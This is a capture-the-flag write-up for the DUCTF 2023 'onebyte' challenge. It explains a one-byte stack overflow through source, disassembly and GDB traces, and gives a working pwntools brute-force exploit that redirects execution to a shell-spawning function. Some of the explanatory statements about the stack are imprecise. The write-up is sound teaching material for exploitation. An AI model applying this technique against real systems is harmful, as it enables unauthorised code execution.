---
layout: post
title: DUCTF 2023 writeup for 'onebyte'
date: 2023-09-19
---

This writeup will explain how to exploit the "onebyte" CTF challenge.

> *Here's a one byte buffer overflow!*

# Static analysis

Start with the C source code:

```c
void init() {
...

void win() {
    system("/bin/sh");
}

int main() {
		...
    printf("Free junk: 0x%lx\n", init);
		...
    char buf[0x10];
    read(0, buf, 0x11);
}

```

Let's analyze some key information:

- The print statement will yield the address of the *init* function
- A buffer *buf* is declared with 16 bytes
- The insecure *read* function will set 17 bytes into *buf*
- The *win* function will launch a shell, although the application does not call this function directly

With this information, we can infer a few things:

- If we can call *win*, we will gain a shell, and presumably gain the flag. This saves us the legwork of crafting shellcode ourselves.
- We can leverage the *read* function call to overflow one byte outside of *buf*.
- Using static or dynamic analysis, we can get the address of *win* by adding the offset of *init* - *win* to the address given in the "free junk" output from the *printf* call.

Observe the disassembly:

```
$ gdb onebyte
...
(gdb) disas main
```

Let's trim it down to the parts that matter for the exploit:

```
   ...
   0x00001239 <+11>:	mov    ebp,esp
   0x0000123b <+13>:	push   ebx
   0x0000123c <+14>:	push   ecx
   0x0000123d <+15>:	sub    esp,0x10
   ...
   0x00001280 <+82>:	lea    eax,[ebp-0x18]
   0x00001283 <+85>:	push   eax
   ...
   0x00001286 <+88>:	call   0x1050 <read@plt>
   ...
   0x00001293 <+101>:	lea    esp,[ebp-0x8]
   0x00001296 <+104>:	pop    ecx
	 ...
   0x00001299 <+107>:	lea    esp,[ecx-0x4]
   0x0000129c <+110>:	ret
```

Now, let's walk through the behavior of the stack. Start with the function prologue.

```
<+11>:	mov    ebp,esp
<+13>:	push   ebx
<+14>:	push   ecx
<+15>:	sub    esp,0x10
```

First, the base pointer *EBP* is 24 bytes below the stack pointer *ESP*. The lowest 16 bytes are allocated for local variables. Based on the C code, we can infer that this space is reserved only for the 16-byte buffer, *buf*. We can also infer that the original value of ECX is located at *EBP*-8.

Next, at *main*+82 and 86, the 16-byte variable *buf* is set as the second parameter to *read*. 

```
<+82>:	lea    eax,[ebp-0x18]
<+85>:	push   eax
...
<+88>:	call   0x1050 <read@plt>
```

So, *buf* is at *EBP*-0x18, or *EBP*-24. This aligns with our analysis of the prologue.

At *main*+101 and 104, ECX is set to its original value, at *EBP*-8. 

```
<+101>:	lea    esp,[ebp-0x8]
<+104>:	pop    ecx
```

Note that this is lined up against the end of the 16-byte *buf*. Also recall that *EPB*-8 is exactly where the one-byte overflow would occur.

Finally, the return address is determined in the last two lines:

```
<+107>:	lea    esp,[ecx-0x4]
<+110>:	ret
```

Observe that the stack pointer is set to whatever data exists at *ECX*-4. When the function returns at *main*+110, the program will try to jump to that location and execute any assembly there. If a function exists there, the application will execute it.

(Note: If you're interested in the LEA and ECX behaviors here, read my previous blog post on this topic. In short, it's related to stack alignment. You're likely to see this behavior in 32-bit GCC builds. You are not likey to see it in 64-bit GCC builds. For the purpose of CTF exercises, the big takeaway is that, for some 32-bit GCC builds, there's a four-byte offset that you will need to account for whenever you deploy a payload that's intended to exploit the return behavior.)

Finally, since we have an intution about the use of the "free junk" (the location of *init*), let's see where the two line up:

```
(gdb) info functions
...
0x000011bd  init
0x00001203  win
0x0000122e  main
...
```

Note that *0x1203* - *0x11bd* = 70, or *0x46*. So, *init*+70 should always point to the location of *win*.

# Dynamic analysis

The methodology is simple:

- Observe the stack after our one-byte overflow
- Try to infer if there's a way to control where the function returns

If we run the application many times, we will get a different location of *init* (the "free junk"). This tells us that ASLR may affect our exploit. With that said, observe that *init*+70 will always match the location of *win*.

Let's set some breakpoints:

```
(gdb) disas main
   ...
   0x0000128b <+93>:	add    esp,0x10
   ...
   0x00001299 <+107>:	lea    esp,[ecx-0x4]
   0x0000129c <+110>:	ret
End of assembler dump.
(gdb) b *(main+93)
Breakpoint 1 at 0x128b
(gdb) b *(main+107)
Breakpoint 2 at 0x1299
(gdb) b *(main+110)
Breakpoint 3 at 0x129c
```

Run the program with 17-byte input. 

```
(gdb) run
Starting program: /home/kali/onebyte 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Free junk: 0x565561bd
Your turn: AAAABBBBCCCCDDDDE

Breakpoint 1, 0x5655628b in main ()
(gdb) 
```

Analyze the data in the stack:

```
(gdb) x/1i $pc
=> 0x5655628b <main+93>:	add    esp,0x10
(gdb) x/8wx $ebp-0x18
0xffffd450:	0x41414141	0x42424242	0x43434343	0x44444444
0xffffd460:	0xffffd445	0xf7e1dff4	0x00000000	0xf7c237c5
(gdb) x/wx $ebp-0x8
0xffffd460:	0xffffd445
```

We can see that all 17 bytes were set, with the final byte, 0x45 ("E"), overflowing into the least-significant byte at *EBP*-8.

```
(gdb) continue
Continuing.

Breakpoint 2, 0x56556299 in main ()
(gdb) x/1i $pc
=> 0x56556299 <main+107>:	lea    esp,[ecx-0x4]
(gdb) i r ecx
ecx            0xffffd445          -11195
(gdb) x/x $ecx
0xffffd445:	0x11ffffd4
(gdb) x/x $ecx-0x4
0xffffd441:	0x50000000
```

Here, note that ECX is set with the overflow bit. Also observe that the current instruction will, after execution, set the stack whatever value is at *ECX*-0x4. Let's confirm this now.

```
(gdb) ni

Breakpoint 3, 0x5655629c in main ()
(gdb) x/1i $pc
=> 0x5655629c <main+110>:	ret
(gdb) i r ecx
ecx            0xffffd445          -11195
(gdb) i r esp
esp            0xffffd441          0xffffd441
(gdb) x/x $esp
0xffffd441:	0x50000000
```

Recall that RET will pop the stack into the instruction pointer (literally `pop eip`) and then try to execute any instructions at that location. However, since we have indirectly manipulated ESP to an arbitrary value (0x45 - 0x4 = 0x41), the program may jump to an arbitrary location in memory. Again, let's confirm this:

```
(gdb) ni
0x50000000 in ?? ()
(gdb) ni

Program received signal SIGSEGV, Segmentation fault.
0x50000000 in ?? ()
```

If we controlled the stack correctly, this would actually try to execute *0x41414141*, the "AAAA" sequence from our payload. If we can manipulate the stack to do this, we should also be able to execute the location of *win*. 

Let's see what we *can* do with the stack.

# Controlling the stack

Revisit the stack addresses and data at *main*+93, right after we set the overflow:

```
(gdb) x/8wx $ebp-0x18
0xffffd450:	0x41414141	0x42424242	0x43434343	0x44444444
0xffffd460:	0xffffd445	0xf7e1dff4	0x00000000	0xf7c237c5
```

Observe the following:

- ESP is eventually set to *0xffffd445* - 4
- However, our target address is *0xffffd450*

In hindsight, if we had set *0x50* instead of *0x45* ("E") as the overflow byte, *ESP* would have jumped to our target. Of course, ASLR will make it impossible to predict exactly which address in the stack we will need to target on any execution. However, we *do* have control over that one byte.

To see what exactly the stack is doing, let's write a simple GDB script:

```
set disable-randomization off
set pagination off
b *(main+93)
run < <(echo 'AAAABBBBCCCCDDDDE')
echo [Analyze EBP-0x18 ...]\n
x/1i $pc
x/8wx $ebp-0x18
continue
quit
```

Then run it in a loop.

```
$ for i in {1..5}; do gdb -x onebyte.gdb ~/onebyte | grep 0x41414141; done
0xffa7c880:	...
0xffe3a0e0:	...
0xff9c72b0:	...
0xffa12d80:	...
0xffb26a30:	...
```

Notice that, on each execution, the target stack address is a power of 10 in base 16: 80, e0, b0, 30, and so forth. Run it enough, and you'll get one that ends in 40, like:

```
0xff8ab340
```

We know that we can control the value of that byte. We also know that, at *main*+107, the value of the byte we send is subtracted by 4. So, if the overflow byte is *0x44* ("D"), we should be able to point to the target stack address.

Let's modify the payload and automate it in the GDB script:

```
run < <(echo 'AAAABBBBBBBBBBBBD')
```

The "D" should resolve to 0x40, thus targeting the "AAAA" on the stack. Modify the *grep* command to catch the message that displays if *0x41414141* is executed. Run this until you see results.

```
$ for i in {1..10}; do gdb -x onebyte.gdb ~/onebyte | grep '0x41414141 in \?\?'; done
0x41414141 in ?? ()
```

So, given enough iterations, we can redirect control to the stack. Further, this took fewer than 10 attempts. On average, this challenge can be completed in under 30 attempts.

The next step is replacing the target with the address of *win*.

# Solution

Here's a working solution:

```python
from pwn import *

def send_exploit(p, command) -> str:
    p.recvuntil(b"Free junk: 0x")
    init_address = int(p.recv(8).decode(), 16)
    win_address = init_address + 70
    payload = p32(win_address) + b"\x42"*12 + b"\x44"
    p.recvline()
    p.send(payload)
    p.sendline(command.encode())
    return p.recvline().decode()

def brute_force(binary_path, command, match): 
    flag = None
    while not flag:
        p = process(binary_path)
        try:
            response = send_exploit(p, command)
            if match in response:
                flag = response
        except EOFError:
            pass
        finally:
            p.close()    
    return flag

if __name__ == "__main__":
    try:
        print(brute_force("/home/kali/onebyte", "whoami", "kali"))
    except KeyboardInterrupt:
        pass
```

Output:

```
$ python3 onebyte.py
[+] Starting local process '/bin/sh': pid 201818
[*] Stopped process '/bin/sh' (pid 201818)
[+] Starting local process '/bin/sh': pid 201821
[*] Stopped process '/bin/sh' (pid 201821)
...
Your turn: kali
```

